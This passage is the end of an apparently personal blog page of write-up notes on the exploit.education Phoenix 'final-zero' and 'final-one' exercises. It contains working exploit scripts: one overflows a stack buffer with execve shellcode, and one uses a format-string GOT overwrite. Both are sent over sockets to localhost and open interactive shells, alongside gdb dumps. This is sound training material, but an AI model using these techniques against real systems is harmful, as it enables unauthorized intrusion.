0xffffdb18:     "AA0AA1AA2AA3AA4AA5AA6AA7AA8AA9AB0AB1AB2AB3AB4AB5AB6AB7AB8AB9AC0AC1AC2AC3AC4AC5AC6AC7AC8AC9AD0AD1AD2AD3AD4AD5AD6AD7AD8AD9AE0AE1AE2AE3AE4AE5AE6AE7AE8AE9AF0AF1AF2AF3AF4AF5AF6AF7AF8AF9AG0AG1AG2AG3AG4AG5AG6AG7AG8AG9AH0AH1AH2AH3AH4AH5AH6AH7AH8AH9AI0AI1AI2AI3AI4AI5AI6AI7AI8AI9AJ0AJ1AJ2AJ3AJ4AJ5AJ6AJ7AJ8AJ9AK0AK1AK2AK3AK4AK5AK6AK7AK8AK9AL0AL1AL2AL3AL4AL5AL6AL7AL8AL9AM0AM1AM2AM3AM4AM5AM6AM7AM8AM9AN0AN1AN2AN3AN4AN5AN6AN7AN8AN9AO0AO1AO2AO3AO4AO5AO6AO7AO8AO9AP0AP1AP2AP3AP4AP5AP6AP7AP8AP9AQ0AQ1AQ2AQ3AQ4AQ5AQ6AQ7AQ8AQ9AR"
</code></pre></div></div>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~# python -c 'print "72413772".decode("hex")'
rA7r
root@kali:~# msf-pattern_offset -l 600 -q r7Ar
[*] Exact match at offset 532
</code></pre></div></div>

<p>This information is enough to develop an exploit. Shellcode was generated using <a href="http://docs.pwntools.com/en/stable/">pwntools</a> what was the idea from <a href="https://www.lucas-bader.com/ctf/2019/07/12/final0">https://www.lucas-bader.com/ctf/2019/07/12/final0</a>.</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pwnlib.asm.asm(pwnlib.shellcraft.i386.linux.sh())
</code></pre></div></div>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>import socket
import time

offset = 532

p = "AAAAAAA\r"
p += "\x90" * 4
p += 'jhh///sh/bin\x89\xe3h\x01\x01\x01\x01\x814$ri\x01\x011\xc9Qj\x04Y\x01\xe1Q\x89\xe11\xd2j\x0bX\xcd\x80'
p += "\x90" * (offset - len(p))
p += "\x20\xdb\xff\xff" # 0xffffdb18 + 8
p += "\n"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("127.0.0.1", 64013))
print s.recv(1024)
s.sendall(p)
while True:
    cmd = raw_input("$ ")
    s.sendall(cmd + "\n")
    print s.recv(1024)

s.close()
</code></pre></div></div>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>user@phoenix-amd64:~$ python fin0.py
Welcome to phoenix/final-zero, brought to you by https://exploit.education

$ id
uid=519(phoenix-i386-final-zero) gid=519(phoenix-i386-final-zero) groups=519(phoenix-i386-final-zero)
</code></pre></div></div>

<h3 id="final-one">Final One</h3>
<p>This exercise is focused on exploitation string formatting vulnerability. Like in <em>Heap three</em> it is required to overwrite GOT entry (of <code class="highlighter-rouge">gets</code>) to redirect execution to own shellcode, but this time it has to be done over a network.</p>

<p>For debugging we can initiate connection, and when script waits on <code class="highlighter-rouge">raw_input</code> we can attach a debugger.</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("127.0.0.1", 64014))
print s.recv(1024)
raw_input("continue...")
p = "username A"
s.sendall(p + "\n")
print s.recv(1024)
raw_input("continue...")
p = "login A"
s.sendall(p + "\n")
print s.recv(1024)
</code></pre></div></div>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code># gdb -p `ps aux | grep "[f]inal-one" | tr -s ' ' | cut -d ' ' -f 2`
gef➤  b *logit+66
Breakpoint 1 at 0x8048827
</code></pre></div></div>
<p>Breakpoint is set on a flawed execution of <code class="highlighter-rouge">fprintf</code>. When the breakpoint hits, we can examine memory to find out that we need to skip 10 parameters, where password buffer is allocated and where <code class="highlighter-rouge">gets</code> address is kept.</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gef➤  x/16x $esp
0xffffd480:     0x08049010      0xffffd490      0x00000000      0x00000000
0xffffd490:     0x69676f4c      0x7266206e      0x31206d6f      0x302e3732
0xffffd4a0:     0x312e302e      0x3733353a      0x61203630      0x415b2073
0xffffd4b0:     0x41414141      0x41414141      0x41414141      0x41414141
gef➤  x/s 0xffffd490
0xffffd490:     "Login from 127.0.0.1:53706 as [", 'A' &lt;repeats 32 times&gt;, "] with password [", 'B' &lt;repeats 32 times&gt;, "]\n"
gef➤  x/x $ebp+8
0xffffdca0:     0xffffdcb6
gef➤  x/s 0xffffdcb6
0xffffdcb6:     'B' &lt;repeats 32 times&gt;
gef➤  x/i 0x8048570
   0x8048570 &lt;fgets@plt&gt;:       jmp    DWORD PTR ds:0x8049e50
gef➤  x/x 0x8049e50
0x8049e50 &lt;fgets@got.plt&gt;:      0xf7fb647e
</code></pre></div></div>

<p>With these details we can prepare the rest of the exploit. For calculation of byte to write it is assumed that it’s always executed from <code class="highlighter-rouge">127.0.0.1</code> and a 5 digit port.</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("127.0.0.1", 64014))
print s.recv(1024)
raw_input("continue...")
p = "username A"
p += "\x58\x9e\x04\x08"
p += "AAAA\x59\x9e\x04\x08AAAA\x5a\x9e\x04\x08\x5b\x9e\x04\x08" + "%013x" * 9 + "%09x" + "%hhn" + "%038x" + "%hhn" + "%035x" + "%hhn%hhn"
s.sendall(p + "\n")
print s.recv(1024)
raw_input("continue...")
p = "login "
p += 'jhh///sh/bin\x89\xe3h\x01\x01\x01\x01\x814$ri\x01\x011\xc9Qj\x04Y\x01\xe1Q\x89\xe11\xd2j\x0bX\xcd\x80'
s.sendall(p + "\n")
while True:
    p = raw_input("$ ")
    s.sendall(p + "\n")
    print s.recv(1024)

</code></pre></div></div>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>user@phoenix-amd64:~$ python fin1.py
Welcome to phoenix/final-one, brought to you by https://exploit.education
[final1] $
continue...
[final1] $
continue...
$ id
uid=520(phoenix-i386-final-one) gid=520(phoenix-i386-final-one) groups=520(phoenix-i386-final-one)
</code></pre></div></div>

 	</div>
</article>

    </div>
<footer><hr></footer>
    
	<!-- Google Analytics -->
	<script>
		(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
		(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
		m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
		})(window,document,'script','//www.google-analytics.com/analytics.js','ga');

		ga('create', 'UA-89484033-1', 'auto');
		ga('send', 'pageview', {
		  'page': '/phoenix/',
		  'title': 'Phoenix (exploit.education) notes'
		});
	</script>
	<!-- End Google Analytics -->


  </body>

</html>
